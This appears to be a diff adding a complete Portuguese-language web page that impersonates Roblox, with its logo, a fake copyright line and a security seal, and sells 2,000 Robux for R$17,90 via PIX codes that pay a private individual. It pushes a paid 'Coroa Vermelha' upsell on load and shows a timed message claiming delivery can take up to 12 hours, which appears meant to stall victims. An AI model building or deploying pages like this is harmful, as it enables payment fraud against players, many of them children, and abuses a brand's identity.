@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Pagamento R$17,90</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Burbank';
+            src: url('https://fonts.cdnfonts.com/css/burbank-big-condensed');
+        }
+        body {
+            font-family: 'Burbank', sans-serif;
+            color: #FFF;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .footer {
+            background-color: #1A1A1A;
+            border-top: 1px solid #333;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 64px;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: #000;
+            background-image: url('https://i.ibb.co/NdQcGJCK/Chat-GPT-Image-24-de-jun-de-2025-21-54-06.png');
+            background-repeat: no-repeat;
+            background-position: center center;
+            background-size: cover;
+            filter: blur(5px);
+            -webkit-filter: blur(5px);
+            z-index: -1;
+        }
+        .content-section {
+            background: none;
+            position: relative;
+            z-index: 1;
+        }
+        .content-wrapper {
+            flex-grow: 1;
+            position: relative;
+            z-index: 1;
+        }
+        header, footer {
+            position: relative;
+            z-index: 2;
+            background: none;
+        }
+        @media (max-width: 767px) {
+            body::before { top: 64px; }
+            .content-section { padding-top: 80px; padding-bottom: 12px; }
+            .crown-btn, .no-btn { margin-top: 10px; } /* Increased vertical spacing for mobile */
+        }
+        @media (min-width: 768px) {
+            body::before { top: 120px; }
+            .content-section { padding-top: 120px; }
+        }
+        .qr-container {
+            background-color: #FFF;
+            padding: 24px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .qr-image {
+            width: 100%;
+            max-width: 300px;
+            height: auto;
+            display: block;
+            margin: 0 auto 16px;
+        }
+        .code-box {
+            background-color: #F3F4F6;
+            padding: 12px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 14px;
+            color: #1F2937;
+            margin-bottom: 16px;
+            white-space: nowrap;
+            overflow-x: auto;
+        }
+        .copy-btn {
+            background-color: #2563EB;
+            color: #FFF;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            transition: background-color 0.3s ease;
+            cursor: pointer;
+            width: 100%;
+        }
+        .copy-btn:hover { background-color: #1E40AF; }
+        .highlight-text { color: #60A5FA; }
+        .crown-modal, .delay-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        .crown-modal-content, .delay-modal-content {
+            background-color: #FFF;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+        .crown-modal-content::before {
+            content: '';
+            position: absolute;
+            top: -2px; right: -2px; bottom: -2px; left: -2px;
+            background: linear-gradient(45deg, #FFD700, #FF4500, #FFD700);
+            z-index: -1;
+            border-radius: 14px;
+            animation: glow 2s infinite;
+            filter: blur(8px);
+            pointer-events: none;
+        }
+        .crown-modal-content h2 { color: #1F2937; font-size: 20px; margin-bottom: 12px; z-index: 1; }
+        .crown-modal-content p { color: #1F2937; font-size: 16px; margin-bottom: 16px; z-index: 1; }
+        .crown-modal-content p strong { color: #34D399; font-weight: bold; } /* Green and bold for highlight */
+        .crown-image {
+            width: 120px;
+            height: auto;
+            margin: 0 auto 16px;
+            display: block;
+            z-index: 1;
+        }
+        .crown-btn {
+            background-color: #34D399;
+            color: #FFF;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 0 8px;
+            transition: background-color 0.3s ease;
+            cursor: pointer;
+            z-index: 1;
+        }
+        .crown-btn:hover { background-color: #10B981; }
+        .no-btn {
+            background-color: #F87171;
+            color: #FFF;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 0 8px;
+            transition: background-color 0.3s ease;
+            cursor: pointer;
+            z-index: 1;
+        }
+        .no-btn:hover { background-color: #EF4444; }
+        .total-price { margin-top: 16px; font-size: 18px; color: #1F2937; z-index: 1; }
+        .delay-modal-content p { color: #1F2937; font-size: 16px; }
+        .delay-modal-content button {
+            background-color: #2563EB;
+            color: #FFF;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 16px;
+            cursor: pointer;
+        }
+        .delay-modal-content button:hover { background-color: #1E40AF; }
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 10px #FFD700; }
+            50% { transform: scale(1.05); box-shadow: 0 0 20px #FF4500; }
+            100% { transform: scale(1); box-shadow: 0 0 10px #FFD700; }
+        }
+        @keyframes glow {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; }
+            100% { opacity: 0.7; }
+        }
+    </style>
+    <script>
+        let initialQrCode = "https://i.ibb.co/39FCym6S/17-90.jpg";
+        let initialCode = "00020101021126750014br.gov.bcb.pix01366a8d44e6-0110-4a4f-a7be-1aed92e490740213COMPRA SEGURA520400005303986540517.905802BR592536.981.857 FRANCISCO ROMA6008BRASILIA62090505ROBUX630482CE";
+        let updatedQrCode = "https://i.ibb.co/sdvdLJ1M/31.jpg";
+        let updatedCode = "00020101021126750014br.gov.bcb.pix01366a8d44e6-0110-4a4f-a7be-1aed92e490740213COMPRA SEGURA520400005303986540531.905802BR592536.981.857 FRANCISCO ROMA6008BRASILIA62090505ROBUX6304DCCE";
+
+        // Initialize code box with initial code
+        window.onload = function() {
+            const codeBox = document.getElementById('pix-code');
+            codeBox.textContent = initialCode;
+        };
+
+        function copyCode() {
+            const codeBox = document.getElementById('pix-code');
+            const codeToCopy = codeBox.textContent; // Use the current content of code-box
+            navigator.clipboard.writeText(codeToCopy).then(() => {
+                alert('Código copiado com sucesso!');
+            }).catch(err => {
+                alert('Erro ao copiar o código: ' + err);
+            });
+        }
+
+        function showCrownModal() {
+            const modal = document.getElementById('crown-modal');
+            modal.style.display = 'flex';
+        }
+
+        function addCrown() {
+            const totalPrice = 31.90; // Set to the exact total you provided
+            const totalElement = document.getElementById('total-price');
+            totalElement.textContent = `Total com Coroa: R$31,90`; // No space, with comma
+            totalElement.style.display = 'block';
+
+            const qrImage = document.querySelector('.qr-image');
+            const codeBox = document.getElementById('pix-code');
+            const valueElement = document.querySelector('.qr-container h2 span');
+            qrImage.src = updatedQrCode;
+            codeBox.textContent = updatedCode;
+            valueElement.textContent = `R$31,90`; // No space, with comma
+
+            document.getElementById('crown-modal').style.display = 'none';
+        }
+
+        function skipCrown() {
+            document.getElementById('total-price').style.display = 'none';
+            document.getElementById('crown-modal').style.display = 'none';
+        }
+
+        function showDelayModal() {
+            const modal = document.getElementById('delay-modal');
+            modal.style.display = 'flex';
+        }
+
+        function closeDelayModal() {
+            document.getElementById('delay-modal').style.display = 'none';
+        }
+
+        // Show crown modal on page load
+        window.onload = function() {
+            showCrownModal();
+            const codeBox = document.getElementById('pix-code');
+            codeBox.textContent = initialCode; // Ensure initial code is set
+            // Set timeout for delay message after 6 minutes (360,000 ms)
+            setTimeout(() => {
+                showDelayModal();
+            }, 360000);
+        };
+    </script>
+</head>
+<body class="flex flex-col min-h-screen">
+    <header class="bg-black shadow-md fixed top-0 w-full z-10">
+        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
+            <img src="https://i.ibb.co/Ng2QNfsD/roblox-logo-transparent-removebg-preview.png" alt="Roblox Logo" class="h-10 md:h-12">
+            <nav class="flex items-center space-x-4">
+                <a href="#" class="text-gray-400 hover:text-blue-400">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path>
+                    </svg>
+                </a>
+                <a href="#" class="text-gray-400 hover:text-blue-400">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+                    </svg>
+                </a>
+            </nav>
+        </div>
+    </header>
+    <div class="content-wrapper flex-grow">
+        <section class="content-section">
+            <div class="container mx-auto px-4 text-center">
+                <h1 class="text-3xl md:text-4xl font-bold mb-4 text-white">
+                    Pagamento para 2.000 Robux
+                </h1>
+                <div class="qr-container">
+                    <img src="https://i.ibb.co/39FCym6S/17-90.jpg" alt="QR Code R$17,90" class="qr-image">
+                    <h2 class="text-xl font-bold text-black mb-2">Valor: <span class="highlight-text">R$17,90</span></h2>
+                    <p class="text-base text-black mb-2">Escaneie o QR Code acima para realizar o pagamento.</p>
+                    <p class="text-base text-black mb-4">Ou copie o código abaixo para pagar no seu banco:</p>
+                    <div class="code-box" id="pix-code"></div>
+                    <button class="copy-btn" onclick="copyCode()">Copiar Código</button>
+                    <p class="text-base text-black mt-4">Após o pagamento, os <span class="highlight-text">2.000 Robux</span> serão creditados automaticamente na sua conta Roblox.</p>
+                    <div id="total-price" class="total-price" style="display: none;"></div>
+                </div>
+            </div>
+        </section>
+    </div>
+    <div id="crown-modal" class="crown-modal">
+        <div class="crown-modal-content">
+            <h2>Que tal um item raríssimo?</h2>
+            <img src="https://tr.rbxcdn.com/180DAY-9fc37531c53eedf28d3c379cc2e21220/420/420/Hat/Webp/noFilter" alt="Coroa Vermelha" class="crown-image">
+            <p>Adicione a Coroa Vermelha por <strong>R$14,90</strong></p>
+            <button class="crown-btn" onclick="addCrown()">Sim, quero!</button>
+            <button class="no-btn" onclick="skipCrown()">Não, obrigado!</button>
+        </div>
+    </div>
+    <div id="delay-modal" class="delay-modal">
+        <div class="delay-modal-content">
+            <p>Ei! Se os Robux ainda não chegaram, pode levar de 1 a 12 horas. Fique tranquilo, estamos processando! 😊</p>
+            <button onclick="closeDelayModal()">OK</button>
+        </div>
+    </div>
+    <footer class="bg-black text-white py-4">
+        <div class="container mx-auto px-4 text-center">
+            <div class="flex flex-col md:flex-row justify-center items-center space-y-2 md:space-y-0 md:space-x-6">
+                <a href="#" class="text-gray-300 hover:text-blue-400 font-medium">Termos de Uso</a>
+                <a href="#" class="text-gray-300 hover:text-blue-400 font-medium">Política de Privacidade</a>
+                <a href="#" class="text-gray-300 hover:text-blue-400 font-medium">Contato</a>
+                <a href="#" class="text-gray-300 hover:text-blue-400 font-medium">Suporte</a>
+            </div>
+            <div class="mt-4 flex justify-center space-x-4">
+                <img src="https://d3ugyf2ht6aenh.cloudfront.net/stores/001/675/550/themes/amazonas/img-1922006266-1679250880-d974b9570d119e845771e0a10c07d6cc1679250880.png?821375030" alt="Security Seal" class="h-12">
+            </div>
+            <p class="text-sm text-gray-500 mt-2">© 2018 Roblox. Todos os direitos reservados. Compra com segurança.</p>
+        </div>
+    </footer>
+</body>
+</html>
